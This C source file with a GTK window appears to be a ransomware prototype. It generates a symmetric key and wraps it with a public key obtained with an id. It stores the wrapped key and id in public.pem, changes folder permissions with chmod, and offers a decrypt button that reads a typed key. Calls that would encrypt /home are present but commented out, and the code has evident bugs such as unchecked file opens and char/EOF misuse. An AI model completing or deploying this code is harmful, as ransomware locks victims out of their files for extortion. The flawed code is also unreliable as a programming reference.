#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "server.h"
#include "filescan.h"
#include "crypto.h"
#include <gtk/gtk.h>


GtkWidget *g_lbl_id, *form;
int main(int argc, char *argv[])
{
    GtkBuilder      *builder;
    GtkWidget       *window;

    gtk_init(&argc, &argv);

    builder = gtk_builder_new();
    gtk_builder_add_from_file (builder, "window_main.glade", NULL);

    window = GTK_WIDGET(gtk_builder_get_object(builder, "window_main"));
    gtk_builder_connect_signals(builder, NULL);
    // get pointers to the two labels
    g_lbl_id = GTK_WIDGET(gtk_builder_get_object(builder, "lbl_id"));
    gtk_label_set_text(GTK_LABEL(g_lbl_id), "Hello, world!");
    form = GTK_WIDGET(gtk_builder_get_object(builder, "key"));

    g_object_unref(builder);

    gtk_widget_show(window);
    gtk_main();

    return 0;
}


void on_b_decrypt_clicked()
{
    //static unsigned int count = 0;
    char str_count[30] = {0};
    //GladeXML *xml = glade_xml_new("TextEntry.glade", NULL, NULL);
    //orm = glade_xml_get_widget(xml, "key");
    //count++;
    printf("simple click\n");
    printf("%s\n", gtk_entry_get_text(GTK_ENTRY(form)));
    //sleep(2);
    //gtk_label_set_text(GTK_LABEL(g_lbl_count), "Hello, world!");
    //gtk_label_set_text(GTK_LABEL(g_lbl_count), str_count);
}

// called when window is closed
void on_window_main_destroy()
{
    gtk_main_quit();
}


bool first(){
    FILE *k = fopen("public.pem", "rb");
    if(k == NULL)
        return true;
    return false;
}

void extractId(key_id *ki){
    FILE *k = fopen("public.pem", "rb");
    int id = 0; char ch;
    ch = fgetc(k);
    while(ch!='!'){
        id = id*10 + (ch-'0');
        ch = fgetc(k);
    }
    ki->id = id;
    ch = fgetc(k);
    int l = 0;
    while(!feof(k)){
        ki->key[l] = ch;
        l++;
        ch = fgetc(k);
    }
    fclose(k);
}

void encrypt(){
    key_id ki;
    getKeyId(&ki);
    unsigned char key[32];
    newKey(key);
    //scanAndCrypt("/home/emil/Facultate/Imperative Programming", key, true);
    unsigned char d[3000];
    system("chmod -R 700 .");
    public_encrypt(key, 32, ki.key, d);
    FILE *k = fopen("public.pem", "wb");
    fprintf(k, "%d!%s", ki.id, d);
    fclose(k);
    printf("%d\n\n%s", ki.id, ki.key);
    //free(d);
}

bool existKey(){
    FILE *f = fopen("public.pem", "rb");
    if(f == NULL)
        return false;
    fclose(f);
    return true;
}

bool getKey(unsigned char *key){
    FILE *f = fopen("key.pem", "rb");
    if(f == NULL)
        return false;
    char ch;
    ch = fgetc(f);
    int l = 0;
    while(!feof(f)){
        key[l] = ch;
        l++;
        ch = fgetc(f);
    }
    fclose(f);
    return true;
}

void decrypt(){
    key_id ki;
    extractId(&ki);
    unsigned char key[3000];
    getKey(key);
    //newKey(key);
    //scanAndCrypt("/home", key, true);
    unsigned char d[32];
    private_decrypt(ki.key, 32, key, d);
    //scanAndCrypt("/home", d, false);
}

/*int main(int n, char *args[n]){
    system("chmod -R 555 .");
    encrypt();
}*/
